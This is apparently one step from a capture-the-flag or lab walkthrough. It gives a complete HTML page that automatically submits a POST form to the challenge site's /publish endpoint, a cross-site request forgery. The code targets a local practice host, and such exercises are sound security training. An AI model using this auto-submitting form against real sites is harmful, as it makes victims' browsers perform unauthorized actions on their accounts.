This level is pretty much the same as the previous level, except we need to send a POST request to the `/publish` endpoint instead, which should be pretty easy to modify

```html
<!DOCTYPE html>
<html>
<head>
    <title>CSRF Attack</title>
</head>
<body>
    <form method="POST" action="http://challenge.localhost/publish"></form>
    <script>document.forms[0].submit()</script>
</body>
</html>
```